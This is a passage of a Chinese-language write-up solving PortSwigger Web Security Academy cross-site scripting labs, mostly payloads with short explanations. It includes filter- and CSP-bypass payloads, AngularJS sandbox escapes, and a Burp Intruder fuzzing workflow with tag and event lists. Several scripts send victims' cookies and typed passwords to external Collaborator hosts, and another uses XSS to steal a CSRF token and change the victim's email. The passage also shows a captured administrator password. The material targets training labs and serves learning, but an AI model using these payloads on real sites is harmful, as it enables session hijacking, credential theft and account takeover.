<p>(2)请注意，此有效负载是否被阻止。在接下来的几个步骤中，我们将使用 Burp Intruder 来测试哪些标签和属性被阻止。<br>(3)打开 Burp 的浏览器并使用实验室中的搜索功能。将结果请求发送到 Burp Intruder。在 Burp Intruder 的 Positions 选项卡中，单击 “Clear §”。在请求模板中，将搜索词的值替换为：&lt;&gt;,将光标放在尖括号之间，然后单击“添加 §”两次以创建有效载荷位置。搜索词的值现在应为：&lt;§§&gt;<br>(4)访问 XSS 备忘单，然后单击“将标签复制到剪贴板”。在 Burp Intruder 的 Payloads 选项卡中，单击 “Paste” 将标签列表粘贴到有效负载列表中。点击 “Start attack”（开始攻击）。<br>(5)攻击完成后，查看结果。请注意，所有有效负载都导致了 HTTP 400 响应，但使用 、、 和 标签的有效负载除外，它们收到了 200 响应。</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>animatetransform<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token operator">&lt;</span>image<span class="token operator">></span>
</code></pre>
<p>返回 Burp Intruder 中的 Positions 选项卡，并将您的搜索词替换为：</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>animatetransform<span class="token operator">%</span><span class="token number">20</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">></span>
</code></pre>
<p>(6)将光标放在字符前面，然后单击“Add §”两次以创建有效负载位置。搜索词的值现在应为：</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>animatetransform<span class="token operator">%</span><span class="token number">20</span>§§<span class="token operator">=</span><span class="token number">1</span><span class="token operator">></span>
</code></pre>
<p>(7)访问 XSS 备忘单，然后单击“将事件复制到剪贴板”。在 Burp Intruder 的 Payloads 选项卡中，单击 “Clear” 以删除之前的有效负载。然后单击 “Paste” 将属性列表粘贴到有效负载列表中。点击 “Start attack”（开始攻击）。<br>(8)攻击完成后，查看结果。请注意，所有负载都会导致 HTTP 400 响应，但负载除外，它会导致 200 响应。onbegin<br>(9)在浏览器中访问以下 URL，确认已调用 alert（） 函数并解决实验室问题：</p>
<pre class=" language-js"><code class="language-js">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>0aa100bd047ee12881854ebc00e20027<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span>"<span class="token operator">></span><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>animatetransform onbegin<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
encodeURI编码下
https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>0aa100bd047ee12881854ebc00e20027<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3E<span class="token operator">%</span>3Csvg<span class="token operator">%</span>3E<span class="token operator">%</span>3Canimatetransform<span class="token operator">%</span>20onbegin<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>3E
</code></pre>
<p>注意：需要放在js代码块中才能xss不生效,在txt中会被解析<br>14:规范链接标签中的反射型 XSS<br>在url后面添加’accesskey=’x’onclick=’alert(1)<br>在进行encodeURI编码</p>
<pre class=" language-js"><code class="language-js">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>0a8900cc04dcf2c180d5948f00730041<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span><span class="token operator">%</span>27accesskey<span class="token operator">=</span><span class="token operator">%</span>27x<span class="token operator">%</span>27onclick<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<p>要触发对自己的漏洞利用，请按以下组合键之一：<br>在 Windows 上：ALT+SHIFT+X<br>在 MacOS 上：CTRL+ALT+X<br>在 Linux 上：Alt+X</p>
<p>15:将反射XSS为JavaScript 字符串，并转义单引号和反斜杠<br>搜索框输入：</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
  或者：  
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span>
</code></pre>
<p>source中</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">var</span> searchTerms <span class="token operator">=</span> <span class="token string">'&lt;/script>&lt;script>alert(1)&lt;/script>'</span><span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>'<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`</span></span><span class="token operator">></span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>16：将反射 XSS 为带有尖括号和双引号的 JavaScript 字符串，HTML 编码和单引号转义<br>payload：'-alert(1)//</p>
<p>先将\转义为\然后’将前面内容进行闭合,再用-间隔内容，最后//注释后面内容</p>
<pre class=" language-js"><code class="language-js"> <span class="token operator">&lt;</span>script<span class="token operator">></span>
                        <span class="token keyword">var</span> searchTerms <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//';</span>
                        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>'<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`</span></span><span class="token operator">></span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>17：存储型XSS 到onclick带有尖括号和双引号的事件中，HTML 编码和单引号和反斜杠转义<br>评论处：<a target="_blank" rel="noopener" href="http://foo/?'-alert(1)-">http://foo?'-alert(1)-</a>'<br>由于'不受encodeURI编码和html十进制和十六进制实体编码控制，<br>浏览器解析为：<a target="_blank" rel="noopener" href="http://test/?%27-alert(1)-%27">http://test/?%27-alert(1)-%27</a><br>控制台解析为：<a target="_blank" rel="noopener" href="http://foo/?'-alert(1)-'">http://foo?'-alert(1)-'</a></p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>p<span class="token operator">></span>
       <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token template-string"><span class="token string">`/resources/images/avatarDefault.svg`</span></span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"avatar"</span><span class="token operator">></span>                            
      <span class="token operator">&lt;</span>a id<span class="token operator">=</span><span class="token string">"author"</span> href<span class="token operator">=</span><span class="token string">"http://foo?'-alert(1)-'"</span> onclick<span class="token operator">=</span><span class="token string">"var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');"</span><span class="token operator">></span>a<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span> <span class="token operator">|</span> <span class="token number">15</span> September <span class="token number">2024</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>18：反射XSS 为带有尖括号、单引号、双引号、反斜杠和反引号Unicode 转义的模板文字<br><a target="_blank" rel="noopener" href="https://0aa900a50400294980761c6e00c50009.web-security-academy.net/?search=%3Cscript%3Ealert(123)%3C/script%3E">https://0aa900a50400294980761c6e00c50009.web-security-academy.net/?search=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E</a><br>测试:<br>搜索框输入：</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>sources中获取到的信息</p>
<pre class=" language-js"><code class="language-js"> <span class="token operator">&lt;</span>script<span class="token operator">></span>
                            <span class="token keyword">var</span> message <span class="token operator">=</span> <span class="token template-string"><span class="token string">`0 search results for '\u003cscript\u003ealert(123)\u003c/script\u003e'`</span></span><span class="token punctuation">;</span>
                            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'searchMessage'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> message<span class="token punctuation">;</span>
                        <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>使用HTML在线编码<br>\u003c进行html实体解码，获得&lt;，其他同理<br>解决：<br>输入内容：</p>
<pre class=" language-js"><code class="language-js">$<span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span>或$<span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token punctuation">}</span>
</code></pre>
<p>19：利用跨站脚本窃取 Cookie<br>collabarator临时子域名：<br>r80ec4rdwac7pt2czguxh540frlj9a2yr.oastify.com</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
url<span class="token punctuation">:</span><span class="token string">'/my-account'</span><span class="token punctuation">,</span>
mode<span class="token punctuation">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>
body<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>发送评论后，刷新页面，在collaborator中找到type为http,且请求体中包含secret和session字段</p>
<p>20:利用跨站点脚本捕获密码<br>collabarator临时子域名：<br>e7m1brq0vxbuog1zy3tkgs3neek68x3ls.oastify.com</p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>username</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>username</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>password</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>password</span> <span class="token attr-name">onchange</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>if(this.value.length)fetch(<span class="token punctuation">'</span>https://BURP-COLLABORATOR-SUBDOMAIN<span class="token punctuation">'</span>,{
method:<span class="token punctuation">'</span>POST<span class="token punctuation">'</span>,
mode: <span class="token punctuation">'</span>no-cors<span class="token punctuation">'</span>,
body:username.value+<span class="token punctuation">'</span>:<span class="token punctuation">'</span>+this.value
});<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
</code></pre>
<p>在collabarator的type为http中查看request to callabarator<br>administrator:hfzcg67v8of35vja210d</p>
<p>21:利用 XSS 执行 CSRF</p>
<p>登录wiener:peter账号</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>input required<span class="token operator">=</span><span class="token string">""</span> type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"csrf"</span> value<span class="token operator">=</span><span class="token string">"E7tYLI9q0fpKyvHfk9B43Q7uKohOuYn2"</span><span class="token operator">></span>
</code></pre>
<p>这将使查看评论的任何人发出 POST 请求，以将其电子邮件地址更改为 。<a href="mailto:test@test.com">test@test.com</a></p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>onload <span class="token operator">=</span> handleResponse<span class="token punctuation">;</span>
req<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span><span class="token string">'/my-account'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> token <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/name="csrf" value="(\w+)"/</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> changeReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    changeReq<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'/my-account/change-email'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    changeReq<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'csrf='</span><span class="token operator">+</span>token<span class="token operator">+</span><span class="token string">'&amp;email=test@test.com'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>22：使用 AngularJS 沙盒转义的反射型 XSS（无字符串）<br>搜索框输入：</p>
<pre class=" language-js"><code class="language-js"><span class="token number">1</span><span class="token operator">&amp;</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt<span class="token operator">%</span>3d<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">|</span>orderBy<span class="token punctuation">:</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span>
</code></pre>
<p>返回提示：”Search term cannot exceed 120 characters”</p>
<p>直接在浏览器输入访问：</p>
<pre class=" language-js"><code class="language-js">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>0aa9001f034675508038ee620064001f<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt<span class="token operator">%</span>3d<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">|</span>orderBy<span class="token punctuation">:</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span>
</code></pre>
<p>该漏洞利用toString（）在不使用引号的情况下创建字符串。然后，它获取String原型，并覆盖每个字符串的charAt函数。这有效地破坏了AngularJS沙盒。接下来，一个数组被传递给orderBy过滤器。然后，我们再次使用toString（）创建字符串和string构造函数属性来设置过滤器的参数。最后，我们使用fromCharCode方法通过将字符代码转换为字符串x=alert（1）来生成有效载荷。由于charAt函数已被覆盖，AngularJS将允许执行通常不允许的代码。</p>
<p>23：使用 AngularJS 沙盒转义和 CSP 的反射型 XSS<br>需要对<a target="_blank" rel="noopener" href="https://0a200081030bf9f9855f69ce00700051.web-security-academy.net/?search=">https://0a200081030bf9f9855f69ce00700051.web-security-academy.net/?search=</a>&lt;input id=x ng-focus=$event.composedPath()|orderBy:’(z=alert)(document.cookie)’&gt;#x<br>进行encodeURI编码,不会对特殊符号编码</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
location<span class="token operator">=</span><span class="token string">'https://0a200081030bf9f9855f69ce00700051.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>该漏洞利用AngularJS中的ng-focus事件创建绕过CSP的焦点事件。它还使用$event，这是一个引用事件对象的AngularJS变量。path属性特定于Chrome，包含触发事件的元素数组。数组中的最后一个元素包含窗口对象。</p>
<p>通常，在JavaScript中，|是位或操作，但在AngularJS中，它表示一个过滤操作，在本例中为orderBy过滤器。冒号表示正在发送到筛选器的参数。在参数中，我们没有直接调用alert函数，而是将其赋值给变量z。只有当orderBy操作到达$event.path数组中的窗口对象时，才会调用该函数。这意味着可以在窗口范围内调用它，而无需显式引用窗口对象，从而有效地绕过AngularJS的窗口检查。</p>
<p>24：反射型 XSS事件处理程序和href属性被阻止</p>
<pre class=" language-js"><code class="language-js">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>YOUR<span class="token operator">-</span>LAB<span class="token operator">-</span>ID<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>a<span class="token operator">></span><span class="token operator">&lt;</span>animate<span class="token operator">+</span>attributeName<span class="token operator">=</span>href<span class="token operator">+</span>values<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>text<span class="token operator">+</span>x<span class="token operator">=</span><span class="token number">20</span><span class="token operator">+</span>y<span class="token operator">=</span><span class="token number">20</span><span class="token operator">></span>Click me<span class="token operator">&lt;</span><span class="token operator">/</span>text<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>
</code></pre>
<p>25：在 JavaScript URL 中反射 XSS，但某些字符被阻止<br><a target="_blank" rel="noopener" href="https://your-lab-id.web-security-academy.net/post?postId=5&amp;'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'">https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&amp;'},x=x=&gt;{throw/**/onerror=alert,1337},toString=x,window+'',{x:'</a><br>分析：<br>评论页面url为：<br><a target="_blank" rel="noopener" href="https://0afd00b80465483a8194a891005800d5.web-security-academy.net/post?postId=5">https://0afd00b80465483a8194a891005800d5.web-security-academy.net/post?postId=5</a><br>查看source的源码：</p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>is-linkback<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:fetch(<span class="token punctuation">'</span>/analytics<span class="token punctuation">'</span>, {method:<span class="token punctuation">'</span>post<span class="token punctuation">'</span>,body:<span class="token punctuation">'</span>/post%3fpostId%3d5<span class="token punctuation">'</span>}).finally(_ <span class="token punctuation">=</span><span class="token punctuation">></span> window.location <span class="token punctuation">=</span> <span class="token punctuation">'</span>/<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Back to Blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
</code></pre>
<p>url解码后：</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"is-linkback"</span><span class="token operator">></span>
                    <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:fetch('/analytics', {method:'post',body:'/post?postId=5'}).finally(_ => window.location = '/')"</span><span class="token operator">></span>Back to Blog<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>
                <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
</code></pre>
<p>添加参数：&amp;’},x=x=&gt;{throw/**/onerror=alert,1337},toString=x,window+’’,{x:’<br>闭合前面内容<br>并整体url编码</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"is-linkback"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>a href<span class="token operator">=</span>"javascript<span class="token punctuation">:</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/analytics'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>method<span class="token punctuation">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>body<span class="token punctuation">:</span><span class="token string">'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window+%27%27,{x%3a%27'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">finally</span><span class="token punctuation">(</span>_ <span class="token operator">=</span><span class="token operator">></span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">)</span>"<span class="token operator">></span>Back to Blog<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
</code></pre>
<p>26：反射型 XSS 受非常严格的 CSP 保护，具有悬空标记攻击<br>查看响应头中的内容：<br>Content-Security-Policy: default-src ‘self’;object-src ‘none’; style-src ‘self’; script-src ‘self’; img-src ‘self’; base-uri ‘none’;</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'//929w6mlvqs6pjbwutyofbnyi99f13s1gq.oastify.com?'</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                 location <span class="token operator">=</span> <span class="token string">'https://0ab700c7035e5c1580b84ebe00a800fb.web-security-academy.net/my-account?email=">&lt;a href="https://exploit-0ab2006303505c2080ac4d03017500d5.exploit-server.net/exploit">Click me&lt;/a>&lt;base target='</span>'<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre>
<p>27:反射型 XSS受 CSP 保护，具有 CSP 旁路功能<br>分析：<br>搜索框输入：a<br>查看响应头：<br>Content-Security-Policy:<br>default-src ‘self’; object-src ‘none’;script-src ‘self’; style-src ‘self’; report-uri /csp-report?token=</p>
<p>使用payload:</p>
<pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&amp;</span>token<span class="token operator">=</span><span class="token punctuation">;</span>script<span class="token operator">-</span>src<span class="token operator">-</span>elem <span class="token string">'unsafe-inline'</span>
</code></pre>
<p>进行encodeURI编码：<br><a target="_blank" rel="noopener" href="https://0a40001403b383c084c536da005200cb.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C/script%3E&amp;token=;script-src-elem%20%27unsafe-inline%27">https://0a40001403b383c084c536da005200cb.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27</a></p>
<p>弹窗后，查看响应头：<br>Content-Security-Policy:<br>default-src ‘self’; object-src ‘none’;script-src ‘self’; style-src ‘self’; report-uri /csp-report?token=;script-src-elem ‘unsafe-inline’</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>备忘单包含许多可以帮助您绕过 WAF 和过滤器的矢量。您可以按事件、标签或浏览器选择向量，并且每个向量都包含概念验证。</p>
<p><strong>Event handlers</strong></p>
<p>标签payload</p>
<pre class=" language-txt"><code class="language-txt">a
a2
abbr
acronym
address
applet
area
article
aside
audio
audio2
b
bdi
bdo
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
custom tags
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
iframe2
image
img
input
input2
input3
input4
ins
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
video2
wbr
xmp
</code></pre>
<p>事件payload</p>
<pre class=" language-txt"><code class="language-txt">onafterprint
onafterscriptexecute
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onauxclick
onbeforecopy
onbeforecut
onbeforeinput
onbeforeprint
onbeforescriptexecute
onbeforetoggle
onbeforeunload
onbegin
onblur
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncontextmenu
oncopy
oncuechange
oncut
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onend
onended
onerror
onfocus
onfocus(autofocus)
onfocusin
onfocusout
onformdata
onfullscreenchange
onhashchange
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onloadstart
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onmozfullscreenchange
onpagehide
onpageshow
onpaste
onpause
onplay
onplaying
onpointercancel
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onprogress
onratechange
onrepeat
onreset
onresize
onscroll
onscrollend
onsearch
onseeked
